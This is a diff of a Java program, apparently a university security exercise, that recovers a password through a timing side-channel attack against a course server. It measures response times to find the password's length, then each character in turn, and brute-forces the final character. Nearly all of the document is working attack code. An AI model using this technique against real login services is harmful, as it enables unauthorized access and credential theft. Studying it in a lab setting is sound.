@@ -14,7 +14,7 @@ import static java.lang.System.exit;
 public class ex01_M2 {
 
     // Const
-    public static int NANOSECONDS_IN_MILLISECONDS = 1000000;
+    public static long NANOSECONDS_IN_MILLISECONDS = 1000000;
     public static char[] AVAILABLE_PASSWORD_CHAR = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
             'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
             'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
@@ -30,7 +30,7 @@ public class ex01_M2 {
     public static int DIFFICULTY = 1;
     public static String USER_ID = "ID";
 
-    public static boolean DO_RATIO_CHECK = true;
+    public static boolean DO_RATIO_CHECK = false;
     public static float MIN_RATIO = 1.05f;
     public static float MAX_RATIO = 150f;
     public static float RATIO_DIFFERENCE_FIRST_TO_SECONDS = 0.15f;
@@ -40,13 +40,13 @@ public class ex01_M2 {
 
     // Flags
     public static long FOUND_THE_PASSWORD = -1;
-    public static long ERROR_WHILE_CHECK_TIME = 0;
+    public static long ERROR_WHILE_CHECK_TIME = -2;
 
 
     /*
      Returns the current value of the most precise available system timer, in nanoseconds(10^-9 seconds).
      */
-    public static long getCurrentTime() {
+    public static long getCurrentTimeInNanoseconds() {
         return System.nanoTime();
     }
 
@@ -54,16 +54,16 @@ public class ex01_M2 {
         long start, end;
         try {
             URL site = new URL(url);
+
+            start = getCurrentTimeInNanoseconds();
             URLConnection conn = site.openConnection();
             conn.setDoInput(true);
-
-            start = getCurrentTime();
             conn.connect();
-            end = getCurrentTime();
-
             InputStream stream = conn.getInputStream();
             byte[] bytesBody={0};
             stream.read(bytesBody);
+            end = getCurrentTimeInNanoseconds();
+
             String body = new String(bytesBody);
 
             if("1".equals(body)){
@@ -91,6 +91,12 @@ public class ex01_M2 {
         return end - start;
     }
 
+    public static float checkResponseTimeInMicrosecond(String url) {
+        long result = checkResponseTime(url);
+        float floatResult = result;
+        return floatResult / 1000;
+    }
+
     public static String buildUrlFromPassword(String password)
     {
         return String.format("http://aoi.ise.bgu.ac.il/?user=%s&password=%s&difficulty=%d", USER_ID, password, DIFFICULTY);
@@ -102,28 +108,35 @@ public class ex01_M2 {
             System.out.println("The timing attack worked!");
         }
         System.out.println(USER_ID + " " + password + " " + DIFFICULTY);
-        exit(0);
+    }
+
+    public static void didntFindThePassword()
+    {
+        if (DEBUG_MESSAGE) {
+            System.out.println("The time attack didn't work...");
+        }
+        System.out.println("We have a problem");
     }
 
     public static class PossiblePasswordData {
         Integer passwordAttempts;
-        Long passwordSumTime;
+        Float passwordSumTime;
         Integer passwordErrors;
-        double passwordResponseAverage;
+        Float passwordResponseAverage;
 
         public PossiblePasswordData()
         {
             passwordAttempts = 0;
-            passwordSumTime = 0L;
+            passwordSumTime = 0f;
             passwordErrors = 0;
-            passwordResponseAverage = 0;
+            passwordResponseAverage = 0f;
         }
     }
 
     public static Map<String, PossiblePasswordData> executeTimingAttack(List<String> passwordsToCheck, int numberOfAttempts, Boolean debug)
     {
         Map<String, PossiblePasswordData> result = new HashMap<String, PossiblePasswordData>();
-        long responseTime;
+        float responseTime;
 
         for (String password : passwordsToCheck) {
             result.put(password, new PossiblePasswordData());
@@ -140,11 +153,16 @@ public class ex01_M2 {
             }
 
             for (String password : passwordsToCheck) {
-                responseTime = checkResponseTime(buildUrlFromPassword(password));
+                responseTime = checkResponseTimeInMicrosecond(buildUrlFromPassword(password));
+
+                if (DEBUG_MESSAGE) {
+                    //System.out.println(String.format("password %s took %f microseconds", password, responseTime));
+                }
 
                 if (responseTime == FOUND_THE_PASSWORD)
                 {
                     foundTheRightPassword(password);
+                    exit(0);
                 }
                 else if (responseTime == ERROR_WHILE_CHECK_TIME)
                 {
@@ -155,7 +173,6 @@ public class ex01_M2 {
                     result.get(password).passwordAttempts += 1;
                     result.get(password).passwordSumTime += responseTime;
                 }
-
             }
         }
 
@@ -262,11 +279,17 @@ public class ex01_M2 {
 
         for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
         {
-            possiblePasswords.add(new String(new char[i]).replace("\0", "!"));
+            possiblePasswords.add(new String(new char[i]).replace("\0", TEST_CHAR));
         }
 
         boolean foundLength = false;
         int length = 0;
+
+        int[] possibleLength = new int[MAX_PASSWORD_LENGTH + 1];
+        for (int i = 0; i <= MAX_PASSWORD_LENGTH; i++) {
+            possibleLength[i] = 0;
+        }
+
         while (!foundLength) {
             boolean attackSucceed = false;
             Map<String, PossiblePasswordData> results = null;
@@ -278,7 +301,7 @@ public class ex01_M2 {
 
             for (String password : possiblePasswords) {
                 if (DEBUG_MESSAGE) {
-                    System.out.println(String.format("Length %d took %f milliseconds", password.length(), results.get(password).passwordResponseAverage / NANOSECONDS_IN_MILLISECONDS));
+                    System.out.println(String.format("Length %d took %f milliseconds", password.length(), results.get(password).passwordResponseAverage / 1000));
                 }
             }
 
@@ -295,6 +318,27 @@ public class ex01_M2 {
                     foundLength = true;
                 }
             }
+            else if(DO_N_TIME_CHECK)
+            {
+                int lengthWithMaxAverage = getMaxAverage(results).length();
+                possibleLength[lengthWithMaxAverage] += 1;
+
+                if (DEBUG_MESSAGE) {
+                    for (int i = 0; i <= MAX_PASSWORD_LENGTH; i++) {
+                        if (possibleLength[i] != 0) {
+                            System.out.println(String.format("Length %d occurs %d times", i, possibleLength[i]));
+                        }
+                    }
+                }
+
+                if (possibleLength[lengthWithMaxAverage] >= N_TIME_CHECK) {
+                    length = lengthWithMaxAverage;
+                    foundLength = true;
+                    if (DEBUG_MESSAGE) {
+                        System.out.println(String.format("Length %d occurs %d times", lengthWithMaxAverage, N_TIME_CHECK));
+                    }
+                }
+            }
             else {
                 length = getMaxAverage(results).length();
                 foundLength = true;
@@ -306,49 +350,75 @@ public class ex01_M2 {
 
     public static String checkThePassword(int passwordLength)
     {
-        char[] availablePasswordChar = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
-                'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
-                'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
+        Map<Character, Integer> charScore = new HashMap<Character, Integer>();
 
         String charactersFoundFromPassword = "";
-        for (int currentPasswordIndex = 0; currentPasswordIndex < passwordLength; currentPasswordIndex++)
+        for (int currentPasswordIndex = 0; currentPasswordIndex < (passwordLength - 1); currentPasswordIndex++)
         {
             List<String> possiblePasswords = new ArrayList<String>();
-            for (char someChar: availablePasswordChar)
+            for (char someChar: AVAILABLE_PASSWORD_CHAR)
             {
                 String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
-                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "!"));
-
+                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", TEST_CHAR));
                 possiblePasswords.add(password);
+
+                charScore.put(someChar, 0);
             }
 
             boolean foundNextChar = false;
             char nextChar;
-            while(!foundNextChar) {
+            while (!foundNextChar)
+            {
                 boolean attackSucceed = false;
                 Map<String, PossiblePasswordData> results = null;
-                while (!attackSucceed) {
+                while (!attackSucceed)
+                {
                     results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
                     attackSucceed = validateAttackResults(results, CHECK_PASSWORD_CHARS_ATTEMPTS);
                 }
                 calculateAverageForEachPossiblePassword(results);
 
-                for (String password : possiblePasswords) {
+                for (String password : possiblePasswords)
+                {
                     if (DEBUG_MESSAGE) {
-                        System.out.println(String.format("char %c took %f milliseconds", password.charAt(currentPasswordIndex), results.get(password).passwordResponseAverage / NANOSECONDS_IN_MILLISECONDS));
+                        System.out.println(String.format("char %c took %f milliseconds", password.charAt(currentPasswordIndex), results.get(password).passwordResponseAverage / 1000));
                     }
                 }
 
-                if (DO_RATIO_CHECK) {
+                if (DO_RATIO_CHECK)
+                {
                     List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
                     nextChar = ratio.get(0).password.charAt(currentPasswordIndex);
-
                     if (DEBUG_MESSAGE) {
                         System.out.println(String.format("char %c bigger then other by %f times", ratio.get(0).password.charAt(currentPasswordIndex), ratio.get(0).ratio));
                         System.out.println(String.format("char %c bigger then other by %f times", ratio.get(1).password.charAt(currentPasswordIndex), ratio.get(1).ratio));
                         System.out.println(String.format("char %c bigger then other by %f times", ratio.get(2).password.charAt(currentPasswordIndex), ratio.get(2).ratio));
                     }
-                    if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS) {
+                    if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS)
+                    {
+                        foundNextChar = true;
+                        charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
+                    }
+                }
+                else if(DO_N_TIME_CHECK)
+                {
+                    char possibleNextChar = getMaxAverage(results).charAt(currentPasswordIndex);
+                    charScore.put(possibleNextChar, charScore.get(possibleNextChar) + 1);
+
+                    if (DEBUG_MESSAGE) {
+                        for (char c: charScore.keySet()) {
+                            if (charScore.get(c) != 0) {
+                                System.out.println(String.format("Char %c occurs %d times", c, charScore.get(c)));
+                            }
+                        }
+                    }
+
+                    if (charScore.get(possibleNextChar) >= N_TIME_CHECK)
+                    {
+                        if (DEBUG_MESSAGE) {
+                            System.out.println(String.format("Char %c occurs %d times", possibleNextChar, N_TIME_CHECK));
+                        }
+                        nextChar = possibleNextChar;
                         foundNextChar = true;
                         charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                     }
@@ -358,17 +428,44 @@ public class ex01_M2 {
                     charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                     foundNextChar = true;
                 }
+
                 if (DEBUG_MESSAGE) {
                     System.out.println(String.format("Password (length %d) until now is %s", passwordLength, charactersFoundFromPassword));
                 }
             }
         }
 
-        return charactersFoundFromPassword;
+        return checkLastCharInThePassword(charactersFoundFromPassword);
+    }
+
+    public static String checkLastCharInThePassword(String passwordUntilNow)
+    {
+        List<String> possiblePasswords = new ArrayList<String>();
+        for (char someChar: AVAILABLE_PASSWORD_CHAR)
+        {
+            String password = String.format("%s%c", passwordUntilNow, someChar);
+            possiblePasswords.add(password);
+        }
+
+        for (String password : possiblePasswords) {
+            long result = ERROR_WHILE_CHECK_TIME;
+            int errorRetryCount = 10;
+            while (ERROR_WHILE_CHECK_TIME == result && errorRetryCount != 0) {
+                result = checkResponseTime(buildUrlFromPassword(password));
+                if (FOUND_THE_PASSWORD == result)
+                {
+                    foundTheRightPassword(password);
+                    return password;
+                }
+                errorRetryCount -= 1;
+            }
+        }
+        didntFindThePassword();
+        return "";
     }
 
     public static void main(String[] args) {
-        long startTime = getCurrentTime();
+        long startTime = getCurrentTimeInNanoseconds();
         int passwordLength = checkPasswordLength();
         if(DEBUG_MESSAGE) {
             System.out.println(String.format("Password length is %d", passwordLength));
@@ -377,9 +474,7 @@ public class ex01_M2 {
         String password = checkThePassword(passwordLength);
         if(DEBUG_MESSAGE) {
             System.out.println(String.format("The password is %s", password));
-            System.out.println(String.format("took %d seconds", (getCurrentTime() - startTime) / (NANOSECONDS_IN_MILLISECONDS*1000)));
+            System.out.println(String.format("took %d seconds", (getCurrentTimeInNanoseconds() - startTime) / (NANOSECONDS_IN_MILLISECONDS * 1000)));
         }
-
-        foundTheRightPassword(password);
     }
 }
